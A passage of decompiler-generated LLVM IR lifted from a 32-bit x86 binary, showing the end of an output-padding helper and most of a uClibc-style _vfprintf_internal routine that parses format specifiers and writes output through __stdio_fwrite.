  %v0_804a56c = load i32, i32* @ebx, align 4
  %v2_804a56c = sub i32 %v0_804a56c, %v3_804a564
  store i32 %v2_804a56c, i32* @ebx, align 4
  store i32 %v3_804a564, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804a56c, 1
  br i1 %tmp23, label %dec_label_pc_804a58a, label %dec_label_pc_804a574

dec_label_pc_804a574:                             ; preds = %dec_label_pc_804a55d
  %v0_804a574 = load i32, i32* @edi, align 4
  %v1_804a574 = urem i32 %v0_804a574, 128
  store i32 %v1_804a574, i32* @edi, align 4
  store i32 %v2_804a56c, i32* @ecx, align 4
  store i32 %v1_804a574, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804a57f = call i32 @_charpad()
  store i32 %v0_804a57f, i32* @ebp, align 4
  %v12_804a586 = icmp eq i32 %v0_804a57f, %v2_804a56c
  %v1_804a588 = icmp eq i1 %v12_804a586, false
  br i1 %v1_804a588, label %dec_label_pc_804a5a6, label %dec_label_pc_804a574.dec_label_pc_804a58a_crit_edge

dec_label_pc_804a574.dec_label_pc_804a58a_crit_edge: ; preds = %dec_label_pc_804a574
  %v0_804a58a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a58a

dec_label_pc_804a58a:                             ; preds = %dec_label_pc_804a574.dec_label_pc_804a58a_crit_edge, %dec_label_pc_804a55d
  %v0_804a58a = phi i32 [ %v0_804a58a.pre, %dec_label_pc_804a574.dec_label_pc_804a58a_crit_edge ], [ %v3_804a564, %dec_label_pc_804a55d ]
  store i32 %v0_804a58a, i32* @ebx, align 4
  br label %dec_label_pc_804a58c

dec_label_pc_804a58c:                             ; preds = %entry, %dec_label_pc_804a58a
  %v0_804a597 = phi i32 [ %arg3, %entry ], [ %v0_804a58a, %dec_label_pc_804a58a ]
  %tmp24 = icmp slt i32 %v0_804a597, 1
  br i1 %tmp24, label %dec_label_pc_804a5a4, label %dec_label_pc_804a592

dec_label_pc_804a592:                             ; preds = %dec_label_pc_804a58c
  %v0_804a592 = load i32, i32* @ecx, align 4
  %v5_804a59c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804a597, i32 %arg1, i32 %v0_804a592)
  br label %dec_label_pc_804a5a4

dec_label_pc_804a5a4:                             ; preds = %dec_label_pc_804a58c, %dec_label_pc_804a592
  %v1_804a5a4 = phi i32 [ 0, %dec_label_pc_804a58c ], [ %v5_804a59c, %dec_label_pc_804a592 ]
  %v0_804a5a4 = load i32, i32* @ebp, align 4
  %v2_804a5a4 = add i32 %v0_804a5a4, %v1_804a5a4
  br label %dec_label_pc_804a5a6

dec_label_pc_804a5a6:                             ; preds = %dec_label_pc_804a574, %dec_label_pc_804a5a4
  %v0_804a5a9 = phi i32 [ %v0_804a57f, %dec_label_pc_804a574 ], [ %v2_804a5a4, %dec_label_pc_804a5a4 ]
  ret i32 %v0_804a5a9

; uselistorder directives
  uselistorder i32 %v0_804a597, { 1, 0 }
  uselistorder i32 %v0_804a57f, { 1, 0, 2 }
  uselistorder i32 %v1_804a574, { 1, 0 }
  uselistorder i32 %v2_804a56c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804a5a6, { 1, 0 }
  uselistorder label %dec_label_pc_804a5a4, { 1, 0 }
  uselistorder label %dec_label_pc_804a58c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804a5ba = ptrtoint i8* %arg2 to i32
  store i32 %v4_804a5ba, i32* @ebx, align 4
  %v2_804a5c2 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804a5c2, i32* @esi, align 4
  %v5_804a5c7 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804a5ba)
  store i32 %v5_804a5c7, i32* %eax.global-to-local, align 4
  %v2_804a5cf = icmp slt i32 %v5_804a5c7, 0
  %v1_804a5d1 = icmp eq i1 %v2_804a5cf, false
  br i1 %v1_804a5d1, label %dec_label_pc_804a611, label %dec_label_pc_804a5d3

dec_label_pc_804a5d3:                             ; preds = %entry
  %v3_804a5d3 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804a5d3, i32* @ebx, align 4
  %v5_804a5da = inttoptr i32 %v3_804a5d3 to i8*
  %v3_804a5db = call i32 @strlen(i8* %v5_804a5da)
  store i32 %v3_804a5db, i32* %eax.global-to-local, align 4
  %v1_804a5e3 = icmp eq i32 %v3_804a5db, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804a5e3, label %dec_label_pc_804ab4a, label %dec_label_pc_804a5f2

dec_label_pc_804a5f2:                             ; preds = %dec_label_pc_804a5d3
  %v0_804a5f2 = load i32, i32* @edx, align 4
  %v0_804a5fb = load i32, i32* @ebx, align 4
  %v6_804a5fc = call i32 @__stdio_fwrite(i32 %v0_804a5fb, i32 %v3_804a5db, i32 %arg1, i32 %v0_804a5f2)
  store i32 %v6_804a5fc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804ab4a

dec_label_pc_804a611:                             ; preds = %entry
  %v6_804a61b = call i32 @_ppfs_prepargs(i32 %v2_804a5c2, i32 %arg3, i32 %v5_804a5c7, i32 %v5_804a5c7)
  store i32 %v6_804a61b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804a628 = load i32, i32* @ebx, align 4
  store i32 %v0_804a628, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a630

dec_label_pc_804a62f:                             ; preds = %dec_label_pc_804a636
  %v1_804a62f = add i32 %v0_804a63e, 1
  store i32 %v1_804a62f, i32* @ebx, align 4
  br label %dec_label_pc_804a630.backedge

dec_label_pc_804a630.backedge:                    ; preds = %dec_label_pc_804a62f, %dec_label_pc_804ab30, %dec_label_pc_804ab3b
  %v1_804a63a19 = phi i32 [ %v1_804a642, %dec_label_pc_804a62f ], [ %v3_804ab30, %dec_label_pc_804ab30 ], [ %v1_804a66e, %dec_label_pc_804ab3b ]
  %v0_804a63017 = phi i32 [ %v1_804a62f, %dec_label_pc_804a62f ], [ %v3_804ab30, %dec_label_pc_804ab30 ], [ %v1_804ab3b, %dec_label_pc_804ab3b ]
  %v4_804a630.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a630

dec_label_pc_804a630:                             ; preds = %dec_label_pc_804a630.backedge, %dec_label_pc_804a611
  %v1_804a642 = phi i32 [ %v1_804a63a19, %dec_label_pc_804a630.backedge ], [ %v0_804a628, %dec_label_pc_804a611 ]
  %v0_804a63e = phi i32 [ %v0_804a63017, %dec_label_pc_804a630.backedge ], [ %v0_804a628, %dec_label_pc_804a611 ]
  %v4_804a630 = phi i32 [ %v4_804a630.pre, %dec_label_pc_804a630.backedge ], [ %v6_804a61b, %dec_label_pc_804a611 ]
  %v1_804a630 = inttoptr i32 %v0_804a63e to i8*
  %v2_804a630 = load i8, i8* %v1_804a630, align 1
  %v3_804a630 = zext i8 %v2_804a630 to i32
  %v5_804a630 = and i32 %v4_804a630, -256
  %v6_804a630 = or i32 %v3_804a630, %v5_804a630
  store i32 %v6_804a630, i32* %eax.global-to-local, align 4
  %v4_804a632 = icmp eq i8 %v2_804a630, 0
  br i1 %v4_804a632, label %dec_label_pc_804a63a, label %dec_label_pc_804a636

dec_label_pc_804a636:                             ; preds = %dec_label_pc_804a630
  %v10_804a636 = icmp eq i8 %v2_804a630, 37
  %v1_804a638 = icmp eq i1 %v10_804a636, false
  br i1 %v1_804a638, label %dec_label_pc_804a62f, label %dec_label_pc_804a63a

dec_label_pc_804a63a:                             ; preds = %dec_label_pc_804a636, %dec_label_pc_804a630
  %v2_804a63a = sub i32 %v0_804a63e, %v1_804a642
  %v12_804a63a = icmp eq i32 %v2_804a63a, 0
  br i1 %v12_804a63a, label %dec_label_pc_804a665, label %dec_label_pc_804a63e

dec_label_pc_804a63e:                             ; preds = %dec_label_pc_804a63a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a63a, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_804a63a, 1
  br i1 %tmp66, label %dec_label_pc_804a65a, label %dec_label_pc_804a648

dec_label_pc_804a648:                             ; preds = %dec_label_pc_804a63e
  %v0_804a648 = load i32, i32* @ebp, align 4
  %v1_804a648 = load i32, i32* @esp, align 4
  %v2_804a648 = add i32 %v1_804a648, -4
  %v3_804a648 = inttoptr i32 %v2_804a648 to i32*
  store i32 %v0_804a648, i32* %v3_804a648, align 4
  %v1_804a649 = add i32 %v1_804a648, 368
  %v2_804a649 = inttoptr i32 %v1_804a649 to i32*
  %v3_804a649 = load i32, i32* %v2_804a649, align 4
  %v5_804a649 = add i32 %v1_804a648, -8
  %v6_804a649 = inttoptr i32 %v5_804a649 to i32*
  store i32 %v3_804a649, i32* %v6_804a649, align 4
  %v0_804a650 = load i32, i32* @esi, align 4
  %v2_804a650 = add i32 %v1_804a648, -12
  %v3_804a650 = inttoptr i32 %v2_804a650 to i32*
  store i32 %v0_804a650, i32* %v3_804a650, align 4
  %v0_804a651 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a651 = add i32 %v1_804a648, -16
  %v3_804a651 = inttoptr i32 %v2_804a651 to i32*
  store i32 %v0_804a651, i32* %v3_804a651, align 4
  %v0_804a652 = load i32, i32* %stack_var_-364, align 4
  %v4_804a652 = call i32 @__stdio_fwrite(i32 %v0_804a652, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a652, i32* %eax.global-to-local, align 4
  %v1_804a65a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a65a

dec_label_pc_804a65a:                             ; preds = %dec_label_pc_804a63e, %dec_label_pc_804a648
  %v3_804a662 = phi i32 [ %v2_804a63a, %dec_label_pc_804a63e ], [ %v1_804a65a.pre, %dec_label_pc_804a648 ]
  %v0_804a65a = phi i32 [ 0, %dec_label_pc_804a63e ], [ %v4_804a652, %dec_label_pc_804a648 ]
  %v12_804a65a = icmp eq i32 %v0_804a65a, %v3_804a662
  %v1_804a65c = icmp eq i1 %v12_804a65a, false
  %v0_804ab43.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804a65c, label %dec_label_pc_804ab43, label %dec_label_pc_804a662

dec_label_pc_804a662:                             ; preds = %dec_label_pc_804a65a
  %v1_804a662 = inttoptr i32 %v0_804ab43.pre.pre to i32*
  %v2_804a662 = load i32, i32* %v1_804a662, align 4
  %v4_804a662 = add i32 %v2_804a662, %v3_804a662
  store i32 %v4_804a662, i32* %v1_804a662, align 4
  %v0_804a665.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a665

dec_label_pc_804a665:                             ; preds = %dec_label_pc_804a63a, %dec_label_pc_804a662
  %v0_804ab3b = phi i32 [ %v0_804a63e, %dec_label_pc_804a63a ], [ %v0_804a665.pre, %dec_label_pc_804a662 ]
  %v1_804a665 = inttoptr i32 %v0_804ab3b to i8*
  %v2_804a665 = load i8, i8* %v1_804a665, align 1
  %v3_804a665 = icmp eq i8 %v2_804a665, 0
  br i1 %v3_804a665, label %dec_label_pc_804ab4a, label %dec_label_pc_804a66e

dec_label_pc_804a66e:                             ; preds = %dec_label_pc_804a665
  %v1_804a66e = add i32 %v0_804ab3b, 1
  store i32 %v1_804a66e, i32* %edx.global-to-local, align 4
  %v2_804a671 = inttoptr i32 %v1_804a66e to i8*
  %v3_804a671 = load i8, i8* %v2_804a671, align 1
  %v12_804a671 = icmp eq i8 %v3_804a671, 37
  br i1 %v12_804a671, label %dec_label_pc_804ab3b, label %dec_label_pc_804a67b

dec_label_pc_804a67b:                             ; preds = %dec_label_pc_804a66e
  %v1_804a67b = load i32, i32* @esp, align 4
  %v2_804a67b = add i32 %v1_804a67b, 16
  %v3_804a67b = inttoptr i32 %v2_804a67b to i32*
  store i32 %v1_804a66e, i32* %v3_804a67b, align 4
  %v0_804a67f = load i32, i32* @esp, align 4
  %v1_804a67f = add i32 %v0_804a67f, 340
  %v2_804a67f = inttoptr i32 %v1_804a67f to i32*
  store i32 0, i32* %v2_804a67f, align 4
  %v0_804a68a = load i32, i32* @esp, align 4
  %v1_804a68d = add i32 %v0_804a68a, 16
  store i32 %v1_804a68d, i32* @ebx, align 4
  %v2_804a691 = add i32 %v0_804a68a, -16
  %v3_804a691 = inttoptr i32 %v2_804a691 to i32*
  store i32 %v1_804a68d, i32* %v3_804a691, align 4
  %v0_804a692 = load i32, i32* %stack_var_-364, align 4
  %v1_804a692 = inttoptr i32 %v0_804a692 to i32*
  %v2_804a692 = call i32 @_ppfs_parsespec(i32* %v1_804a692)
  store i32 %v2_804a692, i32* %eax.global-to-local, align 4
  %v0_804a697 = load i32, i32* @ebx, align 4
  %v1_804a697 = load i32, i32* @esp, align 4
  %v2_804a697 = inttoptr i32 %v1_804a697 to i32*
  store i32 %v0_804a697, i32* %v2_804a697, align 4
  %v0_804a69a = load i32, i32* %stack_var_-364, align 4
  %v1_804a69a = call i32 @_ppfs_setargs(i32 %v0_804a69a)
  store i32 %v1_804a69a, i32* %eax.global-to-local, align 4
  %v0_804a69f = load i32, i32* @esp, align 4
  %v1_804a69f = add i32 %v0_804a69f, 70
  %v2_804a69f = inttoptr i32 %v1_804a69f to i8*
  %v3_804a69f = load i8, i8* %v2_804a69f, align 1
  %v4_804a69f = zext i8 %v3_804a69f to i32
  store i32 %v4_804a69f, i32* @edi, align 4
  %v1_804a6a4 = add i32 %v0_804a69f, 16
  %v1_804a6a7 = add i32 %v0_804a69f, 56
  %v2_804a6a7 = inttoptr i32 %v1_804a6a7 to i32*
  %v3_804a6a7 = load i32, i32* %v2_804a6a7, align 4
  %v1_804a6ac = add i32 %v0_804a69f, 112
  store i32 %v1_804a6ac, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_804a6a7, 1
  br i1 %tmp67, label %dec_label_pc_804a6b9, label %dec_label_pc_804a6b2

dec_label_pc_804a6b2:                             ; preds = %dec_label_pc_804a67b
  %v2_804a6b2 = zext i8 %v3_804a69f to i32
  %v3_804a6b2 = mul nuw nsw i32 %v2_804a6b2, 12
  store i32 %v3_804a6b2, i32* %eax.global-to-local, align 4
  %v2_804a6b5 = add i32 %v0_804a69f, 100
  %v3_804a6b5 = add i32 %v2_804a6b5, %v3_804a6b2
  store i32 %v3_804a6b5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a6b9

dec_label_pc_804a6b9:                             ; preds = %dec_label_pc_804a67b, %dec_label_pc_804a6b2
  %v0_804a6c127 = phi i32 [ %v1_804a6ac, %dec_label_pc_804a67b ], [ %v3_804a6b5, %dec_label_pc_804a6b2 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804a6bb = add i32 %v0_804a69f, 60
  %v2_804a6bb = inttoptr i32 %v1_804a6bb to i32*
  %v3_804a6bb = load i32, i32* %v2_804a6bb, align 4
  store i32 %v3_804a6bb, i32* %ecx.global-to-local, align 4
  %v2_804a6cc80 = sub i32 0, %v3_804a6bb
  %v10_804a6cc83 = and i32 %v3_804a6bb, %v2_804a6cc80
  %v11_804a6cc84 = icmp slt i32 %v10_804a6cc83, 0
  %v13_804a6cc85 = icmp slt i32 %v2_804a6cc80, 0
  %v2_804a6ce86 = icmp eq i1 %v13_804a6cc85, %v11_804a6cc84
  br i1 %v2_804a6ce86, label %dec_label_pc_804a6d0, label %dec_label_pc_804a6c1

dec_label_pc_804a6c1:                             ; preds = %dec_label_pc_804a6b9, %dec_label_pc_804a6c1
  %v0_804a6d090 = phi i32 [ %v0_804a6d0, %dec_label_pc_804a6c1 ], [ %v1_804a6a4, %dec_label_pc_804a6b9 ]
  %v2_804a6c189 = phi i32 [ %v1_804a6cb, %dec_label_pc_804a6c1 ], [ 0, %dec_label_pc_804a6b9 ]
  %v0_804a6c188 = phi i32 [ %v1_804a6c8, %dec_label_pc_804a6c1 ], [ %v0_804a6c127, %dec_label_pc_804a6b9 ]
  %v3_804a6c1 = mul i32 %v2_804a6c189, 4
  %v4_804a6c1 = add i32 %v0_804a6d090, 344
  %v5_804a6c1 = add i32 %v4_804a6c1, %v3_804a6c1
  %v6_804a6c1 = inttoptr i32 %v5_804a6c1 to i32*
  store i32 %v0_804a6c188, i32* %v6_804a6c1, align 4
  %v0_804a6c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a6c8 = add i32 %v0_804a6c8, 12
  store i32 %v1_804a6c8, i32* %edx.global-to-local, align 4
  %v0_804a6cb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a6cb = add i32 %v0_804a6cb, 1
  store i32 %v1_804a6cb, i32* %eax.global-to-local, align 4
  %v1_804a6cc.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a6cc = sub i32 %v1_804a6cb, %v1_804a6cc.pre
  %v8_804a6cc = xor i32 %v1_804a6cb, %v1_804a6cc.pre
  %v9_804a6cc = xor i32 %v2_804a6cc, %v1_804a6cb
  %v10_804a6cc = and i32 %v9_804a6cc, %v8_804a6cc
  %v11_804a6cc = icmp slt i32 %v10_804a6cc, 0
  %v13_804a6cc = icmp slt i32 %v2_804a6cc, 0
  %v2_804a6ce = icmp eq i1 %v13_804a6cc, %v11_804a6cc
  %v0_804a6d0 = load i32, i32* @esp, align 4
  br i1 %v2_804a6ce, label %dec_label_pc_804a6d0, label %dec_label_pc_804a6c1

dec_label_pc_804a6d0:                             ; preds = %dec_label_pc_804a6c1, %dec_label_pc_804a6b9
  %v0_804a6d0.lcssa = phi i32 [ %v1_804a6a4, %dec_label_pc_804a6b9 ], [ %v0_804a6d0, %dec_label_pc_804a6c1 ]
  %v1_804a6d0 = add i32 %v0_804a6d0.lcssa, 48
  %v2_804a6d0 = inttoptr i32 %v1_804a6d0 to i32*
  %v3_804a6d0 = load i32, i32* %v2_804a6d0, align 4
  store i32 %v3_804a6d0, i32* @ecx, align 4
  %v1_804a6d4 = icmp eq i32 %v3_804a6d0, 0
  %v1_804a6d6 = icmp eq i1 %v1_804a6d4, false
  br i1 %v1_804a6d6, label %dec_label_pc_804a6fe, label %dec_label_pc_804a6d8

dec_label_pc_804a6d8:                             ; preds = %dec_label_pc_804a6d0
  %v1_804a6d8 = inttoptr i32 %v0_804a6d0.lcssa to i32*
  %v2_804a6d8 = load i32, i32* %v1_804a6d8, align 4
  store i32 %v2_804a6d8, i32* %eax.global-to-local, align 4
  %v1_804a6db = ashr i32 %v2_804a6d8, 31
  store i32 %v1_804a6db, i32* %edx.global-to-local, align 4
  %v2_804a6dc = add i32 %v0_804a6d0.lcssa, -4
  %v3_804a6dc = inttoptr i32 %v2_804a6dc to i32*
  store i32 %v1_804a6db, i32* %v3_804a6dc, align 4
  %v0_804a6dd = load i32, i32* %eax.global-to-local, align 4
  %v2_804a6dd = add i32 %v0_804a6d0.lcssa, -8
  %v3_804a6dd = inttoptr i32 %v2_804a6dd to i32*
  store i32 %v0_804a6dd, i32* %v3_804a6dd, align 4
  %v1_804a6de = add i32 %v0_804a6d0.lcssa, 32
  %v2_804a6de = inttoptr i32 %v1_804a6de to i32*
  %v3_804a6de = load i32, i32* %v2_804a6de, align 4
  %v1_804a6e2 = and i32 %v3_804a6de, 3840
  store i32 %v1_804a6e2, i32* %eax.global-to-local, align 4
  %v2_804a6e7 = add i32 %v0_804a6d0.lcssa, -12
  %v3_804a6e7 = inttoptr i32 %v2_804a6e7 to i32*
  store i32 %v1_804a6e2, i32* %v3_804a6e7, align 4
  %v1_804a6e8 = add i32 %v0_804a6d0.lcssa, 344
  %v2_804a6e8 = inttoptr i32 %v1_804a6e8 to i32*
  %v3_804a6e8 = load i32, i32* %v2_804a6e8, align 4
  store i32 %v3_804a6e8, i32* %eax.global-to-local, align 4
  %v1_804a6ef = inttoptr i32 %v3_804a6e8 to i32*
  %v2_804a6ef = load i32, i32* %v1_804a6ef, align 4
  %v4_804a6ef = add i32 %v0_804a6d0.lcssa, -16
  %v5_804a6ef = inttoptr i32 %v4_804a6ef to i32*
  store i32 %v2_804a6ef, i32* %v5_804a6ef, align 4
  %v0_804a6f1 = call i32 @_store_inttype()
  store i32 %v0_804a6f1, i32* %eax.global-to-local, align 4
  %v0_804a6f6 = load i32, i32* @esp, align 4
  %v1_804a6f6 = add i32 %v0_804a6f6, 16
  br label %dec_label_pc_804ab30

dec_label_pc_804a6fe:                             ; preds = %dec_label_pc_804a6d0
  %tmp93 = icmp ult i32 %v3_804a6d0, 8
  br i1 %tmp93, label %dec_label_pc_804a707, label %dec_label_pc_804a868

dec_label_pc_804a707:                             ; preds = %dec_label_pc_804a6fe
  %v1_804a707 = add i32 %v3_804a6d0, 134550992
  %v2_804a707 = inttoptr i32 %v1_804a707 to i8*
  %v3_804a707 = load i8, i8* %v2_804a707, align 1
  %v4_804a707 = sext i8 %v3_804a707 to i32
  store i32 %v4_804a707, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804a713 = icmp eq i8 %v3_804a707, 10
  %v1_804a716 = icmp eq i1 %v9_804a713, false
  br i1 %v1_804a716, label %dec_label_pc_804a734, label %dec_label_pc_804a718

dec_label_pc_804a718:                             ; preds = %dec_label_pc_804a707
  %v1_804a718 = add i32 %v0_804a6d0.lcssa, 32
  %v2_804a718 = inttoptr i32 %v1_804a718 to i32*
  %v3_804a718 = load i32, i32* %v2_804a718, align 4
  %v1_804a71e = and i32 %v3_804a718, 32
  store i32 %v1_804a71e, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_804a71e, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_804a72c = trunc i32 %v3_804a718 to i8
  %v2_804a72c = and i8 %v1_804a72c, 64
  %v3_804a72c = icmp eq i8 %v2_804a72c, 0
  %v5_804a72c = zext i8 %v2_804a72c to i32
  %v7_804a72c = and i32 %v3_804a718, -256
  %v8_804a72c = or i32 %v5_804a72c, %v7_804a72c
  store i32 %v8_804a72c, i32* %edx.global-to-local, align 4
  br i1 %v3_804a72c, label %dec_label_pc_804a734, label %dec_label_pc_804a731

dec_label_pc_804a731:                             ; preds = %dec_label_pc_804a718
  %v2_804a731 = or i32 %tmp69, 128
  store i32 %v2_804a731, i32* @ebx, align 4
  br label %dec_label_pc_804a734

dec_label_pc_804a734:                             ; preds = %dec_label_pc_804a718, %dec_label_pc_804a707, %dec_label_pc_804a731
  %tmp94 = icmp ult i32 %v3_804a6d0, 6
  br i1 %tmp94, label %dec_label_pc_804a739, label %dec_label_pc_804a751

dec_label_pc_804a739:                             ; preds = %dec_label_pc_804a734
  %v9_804a739 = icmp eq i32 %v3_804a6d0, 3
  %v1_804a73c = icmp eq i1 %v9_804a739, false
  br i1 %v1_804a73c, label %dec_label_pc_804a745, label %dec_label_pc_804a73e

dec_label_pc_804a73e:                             ; preds = %dec_label_pc_804a739
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804a753

dec_label_pc_804a745:                             ; preds = %dec_label_pc_804a739
  %v9_804a74a = icmp eq i32 %v3_804a6d0, 1
  br i1 %v9_804a74a, label %dec_label_pc_804a758, label %dec_label_pc_804a753

dec_label_pc_804a751:                             ; preds = %dec_label_pc_804a734
  %v1_804a751 = sub nsw i32 0, %v4_804a707
  store i32 %v1_804a751, i32* @esi, align 4
  br label %dec_label_pc_804a753

dec_label_pc_804a753:                             ; preds = %dec_label_pc_804a745, %dec_label_pc_804a73e, %dec_label_pc_804a751
  br label %dec_label_pc_804a758

dec_label_pc_804a758:                             ; preds = %dec_label_pc_804a745, %dec_label_pc_804a753
  %storemerge105 = phi i32 [ 11, %dec_label_pc_804a753 ], [ 6, %dec_label_pc_804a745 ]
  store i32 %storemerge105, i32* @ebp, align 4
  %v1_804a758 = add i32 %v0_804a6d0.lcssa, 7
  %v2_804a758 = inttoptr i32 %v1_804a758 to i8*
  store i8 32, i8* %v2_804a758, align 1
  %v0_804a75d = load i32, i32* @esp, align 4
  %v1_804a75d = add i32 %v0_804a75d, 20
  %v2_804a75d = inttoptr i32 %v1_804a75d to i32*
  %v3_804a75d = load i32, i32* %v2_804a75d, align 4
  %v5_804a75d = icmp slt i32 %v3_804a75d, 0
  %v1_804a762 = icmp eq i1 %v5_804a75d, false
  br i1 %v1_804a762, label %dec_label_pc_804a76c, label %dec_label_pc_804a764

dec_label_pc_804a764:                             ; preds = %dec_label_pc_804a758
  %v1_804a764 = add i32 %v0_804a75d, 36
  %v2_804a764 = inttoptr i32 %v1_804a764 to i8*
  %v3_804a764 = load i8, i8* %v2_804a764, align 1
  %v4_804a764 = zext i8 %v3_804a764 to i32
  %v5_804a764 = load i32, i32* %edx.global-to-local, align 4
  %v6_804a764 = and i32 %v5_804a764, -256
  %v7_804a764 = or i32 %v6_804a764, %v4_804a764
  store i32 %v7_804a764, i32* %edx.global-to-local, align 4
  %v3_804a768 = add i32 %v0_804a75d, 7
  %v4_804a768 = inttoptr i32 %v3_804a768 to i8*
  store i8 %v3_804a764, i8* %v4_804a768, align 1
  %v0_804a76c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a76c

dec_label_pc_804a76c:                             ; preds = %dec_label_pc_804a758, %dec_label_pc_804a764
  %v1_804a785 = phi i32 [ %v0_804a75d, %dec_label_pc_804a758 ], [ %v0_804a76c.pre, %dec_label_pc_804a764 ]
  %v1_804a76c = add i32 %v1_804a785, 344
  %v2_804a76c = inttoptr i32 %v1_804a76c to i32*
  %v3_804a76c = load i32, i32* %v2_804a76c, align 4
  store i32 %v3_804a76c, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804a778 = add i32 %v3_804a6d0, -1
  %v8_804a778 = icmp eq i32 %v1_804a778, 0
  store i32 %v1_804a778, i32* %ecx.global-to-local, align 4
  %v0_804a785.pre = load i32, i32* @edi, align 4
  br i1 %v8_804a778, label %dec_label_pc_804a785, label %dec_label_pc_804a77b

dec_label_pc_804a77b:                             ; preds = %dec_label_pc_804a76c
  %v2_804a77b = mul i32 %v0_804a785.pre, 4
  %v3_804a77b = add i32 %v1_804a785, 52
  %v4_804a77b = add i32 %v3_804a77b, %v2_804a77b
  %v5_804a77b = inttoptr i32 %v4_804a77b to i32*
  %v6_804a77b = load i32, i32* %v5_804a77b, align 4
  %v1_804a77f = and i32 %v6_804a77b, 3840
  store i32 %v1_804a77f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a785

dec_label_pc_804a785:                             ; preds = %dec_label_pc_804a76c, %dec_label_pc_804a77b
  %v2_804a785 = add i32 %v1_804a785, -4
  %v3_804a785 = inttoptr i32 %v2_804a785 to i32*
  store i32 %v0_804a785.pre, i32* %v3_804a785, align 4
  %v0_804a786 = load i32, i32* @esi, align 4
  %v2_804a786 = add i32 %v1_804a785, -8
  %v3_804a786 = inttoptr i32 %v2_804a786 to i32*
  store i32 %v0_804a786, i32* %v3_804a786, align 4
  %v0_804a787 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a787 = add i32 %v1_804a785, -12
  %v3_804a787 = inttoptr i32 %v2_804a787 to i32*
  store i32 %v0_804a787, i32* %v3_804a787, align 4
  %v0_804a788 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a788 = add i32 %v1_804a785, -16
  %v3_804a788 = inttoptr i32 %v2_804a788 to i32*
  store i32 %v0_804a788, i32* %v3_804a788, align 4
  %v0_804a789 = call i32 @_load_inttype()
  %v0_804a78e = load i32, i32* @ebx, align 4
  %v1_804a78e = load i32, i32* @esp, align 4
  %v2_804a78e = inttoptr i32 %v1_804a78e to i32*
  store i32 %v0_804a78e, i32* %v2_804a78e, align 4
  %v0_804a791 = load i32, i32* @esi, align 4
  %v1_804a791 = load i32, i32* @esp, align 4
  %v2_804a791 = add i32 %v1_804a791, -4
  %v3_804a791 = inttoptr i32 %v2_804a791 to i32*
  store i32 %v0_804a791, i32* %v3_804a791, align 4
  %v0_804a792 = load i32, i32* @edx, align 4
  %v2_804a792 = add i32 %v1_804a791, -8
  %v3_804a792 = inttoptr i32 %v2_804a792 to i32*
  store i32 %v0_804a792, i32* %v3_804a792, align 4
  %v2_804a793 = add i32 %v1_804a791, -12
  %v3_804a793 = inttoptr i32 %v2_804a793 to i32*
  store i32 %v0_804a789, i32* %v3_804a793, align 4
  %v1_804a794 = add i32 %v1_804a791, 347
  store i32 %v1_804a794, i32* %eax.global-to-local, align 4
  %v2_804a79b = add i32 %v1_804a791, -16
  %v3_804a79b = inttoptr i32 %v2_804a79b to i32*
  store i32 %v1_804a794, i32* %v3_804a79b, align 4
  %v0_804a79c = load i32, i32* %stack_var_-364, align 4
  %v5_804a79c = inttoptr i32 %v0_804a79c to i8*
  %v6_804a79c = call i32 @_uintmaxtostr(i8* %v5_804a79c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804a79c, i32* %eax.global-to-local, align 4
  %v0_804a7a1 = load i32, i32* @esp, align 4
  %v1_804a7a1 = add i32 %v0_804a7a1, 32
  store i32 %v6_804a79c, i32* @edi, align 4
  %v1_804a7a6 = add i32 %v0_804a7a1, 80
  %v2_804a7a6 = inttoptr i32 %v1_804a7a6 to i32*
  %v3_804a7a6 = load i32, i32* %v2_804a7a6, align 4
